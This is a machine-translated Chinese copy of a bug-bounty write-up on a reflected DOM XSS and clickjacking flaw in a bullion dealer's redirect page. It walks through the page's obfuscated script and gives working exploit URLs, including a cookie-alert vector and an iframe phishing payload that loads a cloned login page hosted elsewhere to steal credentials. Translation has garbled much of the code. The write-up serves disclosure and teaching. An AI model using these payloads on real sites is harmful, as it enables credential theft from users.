<html>
<head>
<title>Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">反映了https://silvergoldbull.de/bt.html的XSS和点击劫持</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0?source=collection_archive---------0-----------------------#2018-09-13">https://infosecwriteups.com/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0?source=collection_archive---------0-----------------------#2018-09-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="6f8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在silvergoldbull网站上做蜘蛛搜索时，我注意到一个奇怪的请求，请求人向<a class="ae kl" href="https://silvergoldbull.de/bt.html" rel="noopener ugc nofollow" target="_blank">https://silvergoldbull.de/bt.html</a>提出了如下请求:</p><blockquote class="km kn ko"><p id="8ec1" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">【https://silvergoldbull.com/bt.html? T2】g = z 8 iclzhbpnxlzt 2 ypbxlw 9 gdtmxdvmxzv 02 bj 5 cbsvnykx 2 bnjxz 2 xwaz 9 yl 6 MHC 0 RHA 1</p></blockquote><p id="45d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">页面重定向到:</p><blockquote class="km kn ko"><p id="bfee" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">【https://silvergoldbull.com/es/us-top-picks-silver/3 T4】</p></blockquote><p id="6fde" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们检查一下源代码中有什么:</p><blockquote class="km kn ko"><p id="89cc" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var _0x2ad7 = ['split '，' join '，' fromCharCode '，' length '，' abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz 0123456789+/'，' charAt '，' location '，' search '，' substr ']；</p><p id="3bff" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">(函数(_0x1c1079，_0x4030e6) {</p><p id="4b24" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var _ 0x 37524 a = function(_ 0x 43 a4 b 9){</p><p id="8340" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">while ( — _0x43a4b9) {</p><p id="0e0c" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_ 0x1c 1079[' push '](_ 0x1c 1079[' shift ']())；</p><p id="fb49" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi">}</p><p id="67c3" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi">};</p><p id="e4cd" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_ 0x 37524 a((+_ 0x 4030 e 6)；</p><p id="9a1c" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">}(_0x2ad7，0x17c))；</p><p id="bf26" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var _0x11bc = function(_0x4a174f，_0x2b3ed7) {</p><p id="2f9c" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_ 0x4a 174 f = _ 0x4a 174 f—0x 0；</p><p id="d15f" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var _ 0x 51 ADC 6 = _ 0x2ad 7[_ 0x4a 174 f]；</p><p id="a0da" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">return _ 0x51adc6</p><p id="2177" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi">};</p><p id="8607" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">b =函数(_0x1a02a7) {</p><p id="0611" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var _0x4af312 = {}，</p><p id="e322" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_0x2b3791，_0x1b21f9 = 0x0，</p><p id="afe2" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_0x45e157，_0x5eca9b，_0x241abe = 0x0，</p><p id="66d6" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_0x385668，_ 0x2ceca8 = ' '，</p><p id="0193" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_ 0x 3299 C7 = String[_ 0x 11 BC(' 0x 0 ')]，</p><p id="7be0" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_ 0x 2844 F2 = _ 0x 1 a 02 a 7[_ 0x 11 BC(' 0x 1 ')]；</p><p id="1c84" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var _ 0x 5717 D2 = _ 0x 11 BC(' 0x 2 ')；</p><p id="3ab0" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">for(_ 0x2b 3791 = 0x 0；_0x2b3791 &lt; 0x40; _0x2b3791++) {</p><p id="6e6f" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_0x4af312[_0x5717d2[_0x11bc(‘0x3’)](_0x2b3791)] = _0x2b3791;</p><p id="42c3" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi">}</p><p id="8328" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">for (_0x5eca9b = 0x0; _0x5eca9b &lt; _0x2844f2; _0x5eca9b++) {</p><p id="77f5" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_0x45e157 = _0x4af312[_0x1a02a7[_0x11bc(‘0x3’)](_0x5eca9b)];</p><p id="fbc1" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_0x1b21f9 = (_0x1b21f9 &lt;&lt; 0x6) + _0x45e157;</p><p id="df3a" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">_0x241abe += 0x6;</p><p id="785f" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">while (_0x241abe &gt; = 0x8) {</p><p id="93dd" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">((_ 0x 385668 = _ 0x 1b 21 f 9 &gt; &gt;&gt;(_ 0x 241 Abe-= 0x 8)&amp; 0x ff)| | _ 0x 5 ECA 9b &lt; _ 0x 2844 f 2–0x 2)&amp;(_ 0x 2 ECA 8+= _ 0x 3299 c 7(_ 0x 385668))；</p><p id="7fd3" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi">}</p><p id="9a98" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi">}</p><p id="f59b" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">return _ 0x2ceca8</p><p id="c073" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi">};</p><p id="8010" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var p = new URLSearchParams(window[_ 0x 11 BC(' 0x 4 ')][_ 0x 11 BC(' 0x 5 '))；</p><p id="0218" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var h = p[' get '](' g ')；</p><p id="32aa" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var e = h[_ 0x 11 BC(' 0x 6 ')](h[_ 0x 11 BC(' 0x 1 ')]—0x 1)；</p><p id="6cde" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">h = h['substr'](0x0，h[_ 0x 11 BC(' 0x 1 ')]—0x 1)；</p><p id="8f6c" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var eq = Array(parse int(e)+0x 1)[' join '](' = ')；</p><p id="c43b" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var u = b(h[_0x11bc('0x7')]('')['反向']()[_ 0x 11 BC(' 0x 8 ')](' ')+eq)；</p><p id="5864" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">window . location = u . replace(/[' "]+/g，' ')；</p></blockquote><p id="6435" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">脚本从URL获取值，并在最后一步将其设置为window.location。一步一步看起来是这样的:</p><blockquote class="km kn ko"><p id="25b2" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var p = new URLSearchParams(window[_ 0x 11 BC(' 0x 4 ')][_ 0x 11 BC(' 0x 5 '))；</p></blockquote><p id="682b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此变量定义了新的URLSearchParams接口，该接口将window.location.search的值作为参数。在这种情况下，它是g参数的值。所以变量p的值为:</p><blockquote class="km kn ko"><p id="250e" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">？g = z 8 iclzhbpnxlzt 2 ypbxlw 9 gdtmxdvmxzv 02 bj 5 cbsvnykx 2 bnjxz 2 xwaz 9 yl 6 MHC 0 RHA 1</p></blockquote><p id="0226" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来:</p><blockquote class="km kn ko"><p id="b4e5" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var h = p[' get '](' g ')；</p></blockquote><p id="98c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获取g参数的值，并将其值赋给h变量。变量h的值为:</p><blockquote class="km kn ko"><p id="a462" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">z 8 iclzhbpnxlzt 2 ypbxlw 9 gdtmxdvmxzv 02 bj 5 cbsvnykx 2 bnjxz 2 xwaz 9 yl 6 MHC 0 RHA 1</p></blockquote><p id="a0ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一个变量<em class="kp"> e </em>被创建:</p><blockquote class="km kn ko"><p id="b45e" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var e = h[_ 0x 11 BC(' 0x 6 ')](h[_ 0x 11 BC(' 0x 1 ')]—0x 1)；</p></blockquote><p id="e71b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它执行一个substring javascript方法，并获取分配给h变量的字符串的最后一个字符，该字符串的最后一个值是数字1(最后一个值必须是数字，否则会有错误，因为变量eq中的parseInt获取字符串并将其解析为整数，所以该值必须是数字，不能是字母) :</p><blockquote class="km kn ko"><p id="9be8" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">z 8 iclzhbpnxlzt 2 ypbxlw 9 gdtmxdvmxzv 02 bj 5 cbsvnykx 2 bnjxz 2 xwaz 9 yl 6 MHC 0 RHA[1]</p></blockquote><p id="2ba7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一个值h被赋予没有最后一个字符的<em class="kp"> h </em>的值，在本例中为1。所以h的值为:</p><blockquote class="km kn ko"><p id="c39a" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">h = h['substr'](0x0，h[_ 0x 11 BC(' 0x 1 ')]—0x 1)；</p><p id="577f" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">z 8 iclzhbpnxlzt 2 ypbxlw 9 gdtmxdvmxzv 02 bj 5 cbsvnykx 2 bnjxz 2 xwaz 9 yl 6 MHC 0 RHA</p></blockquote><p id="8116" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一个变量<em class="kp"> eq </em>具有包含两个字段的数组的值，join方法将“=”的值添加到数组中。</p><blockquote class="km kn ko"><p id="6890" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var eq = Array(parse int(e)+0x 1)[' join '](' = ')；</p></blockquote><p id="4e8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以数组中的值和变量eq的值是:</p><blockquote class="km kn ko"><p id="8561" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi">=</p></blockquote><p id="4f2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后一步是变量<em class="kp"> u </em>，这里发生了三件事。h的值被拆分到数组中，然后反转并再次连接，eq变量的值被添加到末尾。</p><blockquote class="km kn ko"><p id="bc10" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var u = b(h[_0x11bc('0x7')]('')['反向']()[_ 0x 11 BC(' 0x 8 ')](' ')+eq)；</p></blockquote><p id="4d96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以首先我们得到:</p><blockquote class="km kn ko"><p id="6d37" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">h . split(" ")；</p><p id="1a15" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">(68)[" Z " " 8 " " I " " C " " L " " Z " " H " " B " " p " " N " " X " " L " " Z " " t " " 2 " " Y " " p " " B " " X " " L " " W " " 9 " " G " " d " " t " " M " " X " " d " " V " " M " " X " " Z " " V " " 0 " " 2 " " B " " J " " 5 " " C " " B " " s " " V " " N " " Y " " k " " X " " 2 " " B " " N " " J " " X " " Z " " 2 " " X " " W " " a " " Z " " 9 " " Y " " L " "]</p></blockquote><p id="0ea3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后反转这些值:</p><blockquote class="km kn ko"><p id="78f7" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">h.split(" ")。反向()；</p><p id="16fb" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">(68) ["a "、" H "、" R "、" 0 "、" C "、" H "、" M "、" 6 "、" L "、" Y "、" 9 "、" Z "、" a "、" W "、" X "、" 2 "、" Z "、" X "、" J "、" N "、" B "、" 2 "、" X "、" k "、" Y "、" N "、" V "、" s "、" B "、" C "、" 5 "、" J "、" B "、" 2 "、" 0 "、" V "、" Z "、" X "、" M "、" V "、" d "、" X "、" M "、" t "、" d "、" G "、" 9 "、" W "、" L "、" X "、" B "、" p "、" Y "、" 2 "、" t "、" Z "、" L "、" X "、" X "、" L "、" N "、" N "、" p "、" p "</p></blockquote><p id="5a59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后将这些值相加，并加上eq变量的值:</p><blockquote class="km kn ko"><p id="e994" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">h.split(" ")。反转()。加入(" "+情商)</p><p id="a86b" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">" ahr 0 CHM 6 ly 9 za wx 2 zxjnb 2 xkynvsbc 5 JB 20 vzxmvdxmtdg 9 wlxbpy 2 tzlxnpbhzlci 8 z = "</p></blockquote><p id="f120" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们得到了BASE64编码的最终值，函数b对窗口中的明文和正则表达式进行解码。</p><blockquote class="km kn ko"><p id="ccb1" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">b(" ahr 0 CHM 6 ly 9 za wx 2 zxjnb 2 xkynvsbc 5 JB 20 vzxmvdxmtdg 9 wlxbpy 2 tzlxnpbhzlci 8 z = ")；</p><p id="a625" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">" https://silvergoldbull . com/es/us-top-picks-silver/3 "</p></blockquote><p id="8081" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开发时间:</p><h2 id="1073" class="kt ku iq bd kv kw kx dn ky kz la dp lb jy lc ld le kc lf lg lh kg li lj lk ll bi translated">1.作为简单概念验证的简单XSS</h2><p id="fcbc" class="pw-post-body-paragraph jn jo iq jp b jq lm js jt ju ln jw jx jy lo ka kb kc lp ke kf kg lq ki kj kk ij bi translated">网址:</p><blockquote class="km kn ko"><p id="3f03" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated"><a class="ae kl" href="https://silvergoldbull.com/bt.html?g=xETMv8yOpUWar92bj5CduVWb1N2bkhCdyVGbhpDdwlmcjNXY2Fma1" rel="noopener ugc nofollow" target="_blank">https://silvergoldbull.com/bt.html?g = xet mv 8 yopuwar 92 bj 5 cduvwb 1n 2 bkhcdyvgbhpdwlmcjnxy 2 fma 1</a></p></blockquote><p id="c8e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">概念验证:</p><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi lr"><img src="../Images/a7d199811a14d9c1b26d4ef9ec930859.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Bfo3mTb6rPmWKtk8xyX_0w.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">谷歌Chrome浏览器中的Img 1.0页面加载——绕过了XSS审计员</figcaption></figure><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi lr"><img src="../Images/0c54fbd4042f8b3afe9b7dc51964894f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v0j164zN3iw5keVTLOF4yw.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">Mozilla Firefox中的Img 2.0页面加载</figcaption></figure><p id="f2c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们用的是vector JavaScript:alert(document . cookie)；//111生成不带等号或加号的BASE64，然后我们反转字符串并在末尾添加数值:</p><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/0d22465ecb7fabce467a38f98dfc01ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:924/format:webp/1*ZPdOa8w-k05R8vNkr7M0jg.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">Img 3.0 Base64编码XSS矢量</figcaption></figure><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/d13079fa33cd2940020cfe2ae31e757b.png" data-original-src="https://miro.medium.com/v2/resize:fit:916/format:webp/1*-trgKNgQpxkeoW0LN5hFoA.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">Img 4.0 Base64反向XSS向量</figcaption></figure><p id="8899" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我们无法获得我们需要的cookie，因为HTTPOnly在cookie上，所以我们需要更高级的攻击。一些能给我们带来数据的东西。</p><h1 id="e898" class="mj ku iq bd kv mk ml mm ky mn mo mp lb mq mr ms le mt mu mv lh mw mx my lk mz bi translated">2.使用显示在<a class="ae kl" href="https://silvergoldbull.com" rel="noopener ugc nofollow" target="_blank">https://silvergoldbull.com</a>上的Iframe内的假登录窃取用户登录</h1><p id="2880" class="pw-post-body-paragraph jn jo iq jp b jq lm js jt ju ln jw jx jy lo ka kb kc lp ke kf kg lq ki kj kk ij bi translated">让我们首先克隆登录页面并设置假的https登录页面:</p><blockquote class="km kn ko"><p id="be3d" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">【https://maxon3.github.io/silvergold/ T2】号</p></blockquote><p id="1ef3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我们必须设置注入向量，因为引号和双引号从向量中删除，我们必须使用其他东西来代替它们，我们可以使用反引号并绕过它。步骤:</p><p id="cd77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.使用编码的base64 iframe值(secK参数)在URL请求中设置新参数</p><p id="a683" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.用我们的javascript注入向量请求secK的值(注入向量是g参数的值)</p><p id="f7a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.页面得到渲染和显示</p><p id="6b5f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.用户输入数据并点击登录</p><p id="5ac3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.攻击者有用户数据，最好的事情是URL仍然会显示silvergoldbull</p><p id="2f3d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用的矢量是:</p><blockquote class="km kn ko"><p id="5c85" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">【https://silvergoldbull.com/bt.html? T4】secK = pglmcmftzsbbvbmxvywq 9 indpbmrvdy 5 zdg 9 wkck 7 innyyz 0 nly 9 nb 28 uz 2 wvafe 0 efh VJ 3n 0 ewxlpsjozwlnahq 6 mtawmhb 4 o 3d pzhroewmcu 7 ym 9 yzgvyojaipg = =&amp;g = V8 ylvstkpkcylnwzzbgkdbgdldgybbhki 9 gdhhsz 0 LMC 35 cduvwb 1 N2 bkpddwlmcjnxy 2 fma 1【T5</p></blockquote><p id="51c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">解释道:</p><p id="5422" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">g的值为:</p><blockquote class="km kn ko"><p id="0e46" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">var h = " V8 ylvstkpkcylnwzzbgkdbgdldgybbhki 9 gdhhsz 0 LMC 35 cduvwb 1n 2 bkpddwlmcjnxy 2 fma 1 "；console.log(atob(h.substr(0，h.length-1))。拆分(" ")。反转()。join(" "))；</p><p id="bd22" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">JavaScript:document . write(atob(p[` get `](` seck `))；////</p></blockquote><p id="f4cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们取param secK的值并用atob函数解码，解码完成后，该值被写入DOM并呈现。<br/><br/>secK的值是:</p><blockquote class="km kn ko"><p id="fd53" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">atob(' pglmcmftzsbbvbmxvywq 9 indpbmrvdy 5 zdg 9 wkck 7 innyyz 0 nly 9 nb 28 uz 2 wvafe 0 efh VJ 3n 0 ewxlpsjozwlnahq 6 mtawmhb 4 o 3d pzhroewmcu 7 ym 9 yzgvyojaipg = = ')</p><p id="04c5" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated"><iframe onload="”window.stop();”src=’//goo.gl/hQ4xXo’style=”height:1000px;width:100%;border:0&quot;"/></p></blockquote><p id="371d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们使用google redirector来缩短base64向量，删除我们可以删除的空格，删除边框，设置iframe以获取viewport的完整值，并删除加载旋转动画，我们设置window.stop()在页面完成加载后立即运行。</p><p id="0da2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">概念验证:</p><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi lr"><img src="../Images/893692c4d18fcc749ff31f4a782b05b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UYG5T_rp2ZafCDAXgngAbg.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">使用github页面的假登录iframe服务器在Google Chrome上加载Img 5.0页面</figcaption></figure><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi lr"><img src="../Images/20032e0838117206193187dc802b0267.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GnoMHBG65RnE1OMgfLjtaQ.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">Img 6.0用户提交登录表单后，我们得到了他的数据</figcaption></figure><p id="24ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所有攻击者需要的是共享URL并等待凭证，就是这么简单。</p><p id="7c62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于满足了SAMEORIGIN要求，点击劫持也可能被利用:</p><blockquote class="km kn ko"><p id="a687" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated"><a class="ae kl" 